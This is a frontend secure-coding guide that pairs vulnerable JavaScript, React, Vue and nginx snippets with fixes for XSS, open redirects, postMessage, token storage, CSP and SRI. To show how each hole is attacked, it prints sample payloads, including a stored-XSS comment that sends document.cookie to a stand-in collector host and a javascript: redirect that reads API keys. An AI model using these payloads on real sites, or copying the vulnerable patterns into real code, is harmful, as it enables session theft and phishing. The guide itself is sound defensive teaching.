# Frontend Security Examples

Vulnerable code next to its fix. Each pair names the Top 10 2025 category, the CWE, and the ASVS
chapter, then says why the fix closes the hole rather than just looking safer.

All hostnames, tokens, and nonces are placeholders. Payloads are the minimum needed to show why a
control fails.

## Contents

- [DOM XSS from the URL hash](#dom-xss-from-the-url-hash) - A05, CWE-79
- [React `dangerouslySetInnerHTML` on API data](#react-dangerouslysetinnerhtml-on-api-data) - A05, CWE-79
- [Vue `v-html` in a comment feed](#vue-v-html-in-a-comment-feed) - A05, CWE-79
- [Open redirect after login](#open-redirect-after-login) - A01, CWE-601
- [`postMessage` handler with no origin check](#postmessage-handler-with-no-origin-check) - A05, CWE-346
- [Access token in `localStorage`](#access-token-in-localstorage) - A02, CWE-1004
- [CSP that does not stop XSS](#csp-that-does-not-stop-xss) - A02, CWE-79
- [Third-party script with no integrity check](#third-party-script-with-no-integrity-check) - A03, CWE-353

---

## DOM XSS from the URL hash

`A05:2025` · `CWE-79` · ASVS V1, V3

```javascript
// Vulnerable: the hash never reaches the server, so no WAF or access log sees this
function showTab() {
  const name = decodeURIComponent(location.hash.slice(1));
  document.querySelector("#tab-title").innerHTML = `Viewing: ${name}`;
}

window.addEventListener("hashchange", showTab);
showTab();
```

Exploitation is a link:

```text
https://app.example.com/dashboard#<img src=x onerror=alert(document.domain)>
```

The victim clicks a normal-looking link to your real domain. The payload runs in your origin, with
the user's session, and the hash is never transmitted in the HTTP request - so it does not appear in
server logs, a WAF, or an access audit. The bug is invisible from the server side.

```javascript
// Fixed: text is text
function showTab() {
  const name = decodeURIComponent(location.hash.slice(1));
  document.querySelector("#tab-title").textContent = `Viewing: ${name}`;
}
```

Where the hash selects UI state rather than displaying a string, map it through an allowlist so an
unknown value cannot reach anything:

```javascript
const TABS = { overview: renderOverview, billing: renderBilling, team: renderTeam };

const handler = TABS[location.hash.slice(1)] ?? renderOverview;
handler();
```

Why this works: `textContent` assigns a string to a text node. There is no HTML parse step, so
there is no context in which `<img>` becomes an element. The allowlist version never uses the input
as data at all - it uses it as a key, and an unmatched key falls back to a known-safe default.

The tempting wrong fix is escaping `<` and `>` before the `innerHTML` assignment. That handles the
element-injection case and misses the attribute case entirely: the same helper used in
`innerHTML = '<a href="' + escaped + '">'` still allows `" onmouseover="alert(1)` if quotes are not
also escaped, and single-quoted or unquoted attributes need different escaping again. Escaping is
context-dependent; `textContent` has no context.

---

## React `dangerouslySetInnerHTML` on API data

`A05:2025` · `CWE-79` · ASVS V1, V3

```jsx
// Vulnerable: JSX escapes by default, and this opts out
function ArticleBody({ article }) {
  return (
    <div className="prose" dangerouslySetInnerHTML={{ __html: article.bodyHtml }} />
  );
}
```

"It comes from our own API" is the usual reasoning, and it is wrong twice. The API stores what a
user submitted, so this is stored XSS - it fires for every reader, with no link to click. And an
API response is untrusted input regardless of who owns the API; a bug in another service, a stale
column, or an admin-panel injection all arrive through the same field.

```jsx
// Fixed: sanitize with an explicit allowlist, at the render boundary
import DOMPurify from "dompurify";
import { useMemo } from "react";

const ARTICLE_HTML = {
  ALLOWED_TAGS: ["p", "br", "strong", "em", "code", "pre", "ul", "ol", "li", "a", "h2", "h3", "blockquote"],
  ALLOWED_ATTR: ["href", "title"],
  ALLOWED_URI_REGEXP: /^(?:https?|mailto):/i,
  FORBID_TAGS: ["style", "svg", "math", "form"],
  FORBID_ATTR: ["style", "srcset"],
};

function ArticleBody({ article }) {
  const clean = useMemo(
    () => DOMPurify.sanitize(article.bodyHtml, ARTICLE_HTML),
    [article.bodyHtml]
  );
  return <div className="prose" dangerouslySetInnerHTML={{ __html: clean }} />;
}
```

If the field is plain text - a display name, a comment, a title - do not render it as HTML at all:

```jsx
<div className="prose">{article.bodyText}</div>
```

Why this works: DOMPurify parses the input into a DOM, walks it, and drops every node and attribute
not on the allowlist, then serializes what remains. An allowlist fails closed - a tag nobody
thought of is removed because it is absent, not because it was blocked. The `ALLOWED_URI_REGEXP`
matters independently: without it, `<a href="javascript:alert(1)">` survives a tag allowlist that
permits `a` and `href`.

Two honest gaps. Sanitizing in a `useMemo` keyed on the raw value is correct here, but sanitizing
once on the server and trusting the stored result later is not - the stored value is a snapshot of
one sanitizer version. Sanitize on output. And this config is for article bodies; the same config
in an HTML attribute or a `<style>` context is not safe, because DOMPurify sanitizes document HTML,
not arbitrary fragments in arbitrary contexts.

---

## Vue `v-html` in a comment feed

`A05:2025` · `CWE-79` · ASVS V1, V3

```vue
<!-- Vulnerable: v-html is Vue's opt-out from escaping -->
<template>
  <article v-for="c in comments" :key="c.id" class="comment">
    <h4>{{ c.author }}</h4>
    <div v-html="c.body"></div>
  </article>
</template>
```

One comment containing `<img src=x onerror="fetch('https://collector.example.net/?c='+document.cookie)">`
executes for every user who loads the thread. Stored XSS on an authenticated page is the worst case
in this file: no interaction, every visitor, full session access.

```vue
<!-- Fixed: interpolation for text, sanitized HTML only where formatting is required -->
<script setup>
import DOMPurify from "dompurify";
import { computed } from "vue";

const props = defineProps({ comments: { type: Array, required: true } });

const COMMENT_HTML = {
  ALLOWED_TAGS: ["b", "i", "em", "strong", "code", "a", "br", "p"],
  ALLOWED_ATTR: ["href"],
  ALLOWED_URI_REGEXP: /^https?:/i,
};

const rendered = computed(() =>
  props.comments.map((c) => ({
    ...c,
    safeBody: DOMPurify.sanitize(c.body, COMMENT_HTML),
  }))
);
</script>

<template>
  <article v-for="c in rendered" :key="c.id" class="comment">
    <h4>{{ c.author }}</h4>
    <div v-html="c.safeBody"></div>
  </article>
</template>
```

Note `{{ c.author }}` - mustache interpolation escapes, so the author name needs nothing extra.
If comments are plain text with newlines, drop `v-html` entirely and use `white-space: pre-wrap`.

Why this works: the sanitizer runs before the value reaches the directive, so `v-html` only ever
receives markup drawn from a six-tag allowlist. Escaping-by-default is restored for everything that
does not need formatting.

The tempting wrong fix is a global directive or mixin that "sanitizes all `v-html`". It centralizes
the call but forces one config across every context, which means the rich-text editor's config
leaks into the comment field. Configure per use site.

---

## Open redirect after login

`A01:2025` · `CWE-601` · ASVS V2

```javascript
// Vulnerable: any absolute URL is accepted
const next = new URLSearchParams(location.search).get("next") || "/dashboard";
location.assign(next);
```

Two attacks from one line. `?next=https://app-example.attacker.test/login` sends the user to a
pixel-perfect clone immediately after a successful authentication, when they are most likely to
retype credentials - and the link they clicked was genuinely on your domain, which is what makes it
work. `?next=javascript:fetch('/api/keys').then(r=>r.text()).then(t=>...)` is XSS, because
`location.assign` executes a `javascript:` URL in the current origin.

```javascript
// Fixed: resolve against our origin and require it to stay there
const FALLBACK = "/dashboard";

function safeNext(raw) {
  if (!raw) return FALLBACK;
  let url;
  try {
    url = new URL(raw, location.origin);
  } catch {
    return FALLBACK;
  }
  if (url.origin !== location.origin) return FALLBACK;
  if (url.protocol !== "https:" && url.protocol !== "http:") return FALLBACK;
  return url.pathname + url.search + url.hash;
}

location.assign(safeNext(new URLSearchParams(location.search).get("next")));
```

Stronger where the design allows it - never accept a path from the client:

```javascript
const DESTINATIONS = { dashboard: "/dashboard", billing: "/settings/billing", team: "/team" };
location.assign(DESTINATIONS[key] ?? FALLBACK);
```

Why this works: `new URL(raw, location.origin)` performs the browser's own parse, so the check runs
on the same interpretation the navigation will use. Comparing `url.origin` rejects
`//attacker.test` (protocol-relative), `https://attacker.test`, and `\/\/attacker.test`, all of
which defeat a string check. The protocol check catches `javascript:` and `data:`, whose `origin` is
`"null"` and so would already fail the origin comparison - the explicit check documents the intent.
Returning only the path components discards any authority the attacker smuggled in.

Every string-based approach fails. `startsWith("/")` passes `//attacker.test`.
`startsWith("https://app.example.com")` passes `https://app.example.com.attacker.test`.
`!raw.includes("://")` passes `//attacker.test` and `\/\/attacker.test`. Parse, do not pattern-match.

---

## `postMessage` handler with no origin check

`A05:2025` · `CWE-346` · ASVS V3

```javascript
// Vulnerable: any window that can get a handle to this one can drive it
window.addEventListener("message", (event) => {
  const { type, payload } = event.data;
  if (type === "SET_THEME") document.body.className = payload;
  if (type === "NAVIGATE") location.assign(payload);
  if (type === "RENDER") document.querySelector("#slot").innerHTML = payload;
});

// Vulnerable: and the send side broadcasts to whoever is listening
iframe.contentWindow.postMessage({ type: "SESSION", token: accessToken }, "*");
```

`message` events are delivered from any origin. Any page that opens yours with `window.open`, or
embeds you in an iframe, holds a reference and can post to it - so the `RENDER` branch is XSS
reachable from an attacker's page, and the `NAVIGATE` branch is an open redirect. The `"*"` target
on the send side hands the access token to whatever document currently occupies that frame, which
after a redirect chain is not necessarily the one you loaded.

```javascript
// Fixed: exact origin on both sides, and a validated schema
const TRUSTED_ORIGIN = "https://widget.example.com";

window.addEventListener("message", (event) => {
  if (event.origin !== TRUSTED_ORIGIN) return;
  if (event.source !== iframe.contentWindow) return;

  const msg = event.data;
  if (typeof msg !== "object" || msg === null) return;

  switch (msg.type) {
    case "SET_THEME": {
      const THEMES = { light: "theme-light", dark: "theme-dark" };
      const cls = THEMES[msg.payload];
      if (cls) document.body.className = cls;
      break;
    }
    case "RESIZE": {
      const h = Number(msg.height);
      if (Number.isFinite(h) && h > 0 && h <= 2000) iframe.style.height = `${h}px`;
      break;
    }
    default:
      break;
  }
});

iframe.contentWindow.postMessage({ type: "SESSION_READY" }, TRUSTED_ORIGIN);
```

Why this works: `event.origin` is set by the browser and cannot be forged by the sender, so the
equality check is a real authentication of the peer. Checking `event.source` additionally binds the
message to the specific frame you created, so a second embedded document from the same trusted
origin cannot impersonate the first. Naming the target origin on send means the browser drops the
message if the frame has navigated elsewhere - the token is never delivered to an unexpected
document. And the handler no longer has an HTML sink or a navigation sink at all; every branch maps
input to a server-chosen value.

The tempting wrong fix is `event.origin.endsWith("example.com")`, which accepts
`https://example.com.attacker.test`, or `event.origin.includes("widget")`, which accepts anything.
Compare the whole origin string with `===`.

---

## Access token in `localStorage`

`A02:2025` · `CWE-1004`, `CWE-522` · ASVS V3, V7

```javascript
// Vulnerable: readable by any script that runs in this origin
async function login(email, password) {
  const res = await fetch("/api/login", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ email, password }),
  });
  const { accessToken } = await res.json();
  localStorage.setItem("access_token", accessToken);
}

const authHeader = () => ({ Authorization: `Bearer ${localStorage.getItem("access_token")}` });
```

One XSS anywhere in the origin - including inside a third-party analytics script, a compromised npm
dependency, or a browser extension injecting into the page - reads the token with
`localStorage.getItem` and exfiltrates it. The token then works outside the browser, from the
attacker's machine, until it expires. `localStorage` also has no expiry and survives tab close.

```javascript
// Fixed: the token is a cookie the JS cannot read
// Server sets: Set-Cookie: sid=...; HttpOnly; Secure; SameSite=Lax; Path=/
async function login(email, password) {
  const res = await fetch("/api/login", {
    method: "POST",
    credentials: "same-origin",
    headers: { "Content-Type": "application/json", "X-CSRF-Token": readCsrfToken() },
    body: JSON.stringify({ email, password }),
  });
  if (!res.ok) throw new Error("login_failed");
  // No token handling on the client at all.
}

async function apiPost(path, body) {
  return fetch(path, {
    method: "POST",
    credentials: "same-origin",
    headers: { "Content-Type": "application/json", "X-CSRF-Token": readCsrfToken() },
    body: JSON.stringify(body),
  });
}
```

Why this works: `HttpOnly` removes the token from the JavaScript object graph, so an injected script
cannot read it - the attacker is reduced to making requests from the victim's browser while the page
is open, rather than stealing a portable credential. `Secure` keeps it off plaintext connections and
`SameSite=Lax` blocks the cookie on cross-site POST.

Be honest about the tradeoff rather than presenting cookies as a fix for XSS. The cookie design
adds CSRF as a concern, because the browser now attaches the credential automatically - so it needs
a CSRF token or an equivalent server-side check, which `localStorage` did not. And XSS is still
catastrophic: the attacker can call your API from the victim's session for as long as the page is
open. Cookies bound the damage to session-riding; they do not prevent it. The actual fix for XSS is
the XSS fix.

Middle ground worth knowing: keep a short-lived access token in a JavaScript closure (never in
`localStorage`, never in a global) with the refresh token in an `HttpOnly` cookie. That survives XSS
no better during the page's lifetime but leaves nothing behind after reload.

---

## CSP that does not stop XSS

`A02:2025` · `CWE-79` · ASVS V3, V13

```nginx
# Vulnerable: passes a naive "we have a CSP" check and blocks nothing
add_header Content-Security-Policy "default-src *; script-src 'self' 'unsafe-inline' 'unsafe-eval' https: data:";
```

Every part of that fails. `'unsafe-inline'` permits exactly the injected `<script>` and
`onerror=` handler that XSS relies on. `'unsafe-eval'` re-opens the eval sinks. `https:` allows
script from any HTTPS host on the internet, so `<script src="https://collector.example.net/x.js">`
loads. `data:` allows `<script src="data:text/javascript,...">`. There is no `object-src`, so
`<object data="...">` runs plugin content, and no `base-uri`, so an injected
`<base href="https://attacker.test/">` repoints every relative script URL in the document.

`script-src 'self'` alone is also weak whenever the origin serves user content: an upload endpoint,
a JSONP callback, or an open redirect on your own domain all become script sources.

```nginx
# Fixed: nonce-based, no unsafe keywords, plugin and base-tag paths closed
add_header Content-Security-Policy "
  default-src 'self';
  script-src 'nonce-$request_id' 'strict-dynamic';
  style-src 'self';
  img-src 'self' data:;
  connect-src 'self' https://api.example.com;
  font-src 'self';
  object-src 'none';
  base-uri 'none';
  form-action 'self';
  frame-ancestors 'none';
  require-trusted-types-for 'script';
  upgrade-insecure-requests
" always;
```

```html
<!-- Every legitimate script carries the per-response nonce -->
<script nonce="{{ nonce }}" src="/static/app.a1b2c3.js"></script>
```

Why this works: an injected script has no nonce, because the attacker cannot know a value generated
after their payload was stored and regenerated on every response. `strict-dynamic` lets a
nonce-carrying loader create further scripts programmatically, which is what makes the policy
survivable in a real app without falling back to a host allowlist. `object-src 'none'` and
`base-uri 'none'` close the two paths that bypass `script-src` entirely.
`require-trusted-types-for 'script'` converts every remaining DOM sink assignment into a runtime
`TypeError`, which turns a silent vulnerability into a visible bug.

Deployment notes that matter. The nonce must be unpredictable and per-response - `$request_id` is
nginx's per-request identifier and is acceptable; a build-time constant is not, because it is
guessable from any cached page. Roll out with `Content-Security-Policy-Report-Only` first and read
the reports, because enforcing an untested policy breaks the app. And verify the deployed header,
not the config file:

```bash
curl -sSI https://app.example.com/ | grep -i content-security-policy
curl -sSI https://app.example.com/nope | grep -i content-security-policy   # 404 pages too
```

A CDN, WAF, or framework middleware can strip or replace the header. Also check whether a
`<meta http-equiv="Content-Security-Policy">` tag elsewhere in the app is competing - meta-delivered
policies cannot express `frame-ancestors` or `report-uri`, and two policies intersect, so a stray
one can only make things stricter and more confusing.

---

## Third-party script with no integrity check

`A03:2025` · `CWE-353`, `CWE-829` · ASVS V3, V15

```html
<!-- Vulnerable: a mutable URL on someone else's infrastructure, with full origin access -->
<script src="https://cdn.example.com/analytics/latest.js"></script>
<script src="https://cdn.example.com/widget/v2/widget.min.js"></script>
```

`latest` means the bytes change without your involvement. A third-party script runs with the same
privileges as your own code: it reads the DOM, reads `localStorage`, hooks `fetch`, and can rewrite
the checkout form. A compromise of the CDN, of the vendor's build pipeline, or of the vendor's npm
dependencies is a compromise of your origin - this is the shape of every Magecart-style card
skimming incident.

```html
<!-- Fixed: pinned version, hash-verified, and the CSP nonce -->
<script
  src="https://cdn.example.com/analytics/4.7.2/analytics.js"
  integrity="sha384-PLACEHOLDER_BASE64_HASH_REPLACE_WITH_REAL_VALUE"
  crossorigin="anonymous"
  nonce="{{ nonce }}"
  defer
></script>
```

Generate the hash from the exact bytes you reviewed:

```bash
curl -sS https://cdn.example.com/analytics/4.7.2/analytics.js \
  | openssl dgst -sha384 -binary \
  | openssl base64 -A
```

Better still, self-host: vendor the file into your build, and the CDN stops being part of your trust
boundary at all. Then the CSP does not need a third-party host in `script-src`.

Why this works: the browser hashes the fetched bytes and refuses to execute on mismatch, so a
substituted file fails closed rather than running. `crossorigin="anonymous"` is required for SRI to
be checked on a cross-origin response - without it the response is opaque and the integrity check
cannot be performed. Pinning the version path means the URL's content is immutable, so the hash
stays valid and an upgrade is a deliberate, reviewable change.

Two limitations worth stating. SRI verifies the file you named; it says nothing about what that
file loads afterwards, and most analytics and tag-manager scripts exist precisely to load more
script - so SRI on a loader verifies the loader and nothing else. And SRI does not help if the
vendor ships a malicious version through the normal release channel and you update the hash along
with it. For genuinely untrusted embeds, the boundary is a sandboxed iframe on a separate origin
communicating over an origin-checked `postMessage`, not a hash:

```html
<iframe
  src="https://widget-sandbox.example.com/embed"
  sandbox="allow-scripts allow-forms"
  referrerpolicy="no-referrer"
  title="Support widget"
></iframe>
```

Do not combine `allow-scripts` with `allow-same-origin` on content you do not control - together
they let the framed document remove its own sandbox attribute.

---

## Sources

- <https://owasp.org/Top10/2025/>
- <https://owasp.org/www-project-application-security-verification-standard/>
- <https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html>
- <https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html>
- <https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html>
- <https://www.w3.org/TR/CSP3/>
- <https://github.com/cure53/DOMPurify>
- <https://cwe.mitre.org/data/definitions/79.html>
- <https://cwe.mitre.org/data/definitions/601.html>
- <https://cwe.mitre.org/data/definitions/346.html>
- <https://cwe.mitre.org/data/definitions/353.html>
